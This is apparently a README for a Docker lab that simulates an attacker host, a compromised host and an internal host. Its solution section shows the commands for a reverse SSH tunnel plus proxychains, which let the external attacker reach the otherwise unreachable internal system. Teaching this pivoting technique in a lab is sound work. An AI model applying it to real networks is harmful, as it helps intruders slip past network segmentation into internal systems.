# proxy-demo

## Description
The docker-compose file here launches three machines with a network configuration for the proxy demo.

- proxy-atk: Simulates an external hacker host.
- proxy-ext: Simulates a compromised host that will initiate the tunnel
- proxy-int: Simulates an internal host that cannot be reached by proxy-atk without a tunnel

## Build and run Information
To build, use the docker-compose command:
```sh
docker-compose up --build
```

## Connection Information
To connect to the proxy-ext server, use the command:
```sh
ssh user@localhost -p 2225
```

## Solution
Once an SSH connection is established to proxy-ext, perform a regular ssh session back to proxy-atk.
This can be done with the command:
```sh
ssh attacker@localhost -p 2225
```

Once connected, attempt to curl http://192.168.2.3 . This should be unsuccessful. Exit the ssh session:
```sh
exit
```

Connect again but use the following command to establish a tunnel:
```sh
ssh -R 3434 attacker@localhost -p 2225
```

Now run the curl command again through proxychains:
```sh
proxychains curl http://192.168.2.3
```

A response is received demonstrating the external attacker system communicating to internal systems using the tunnel.
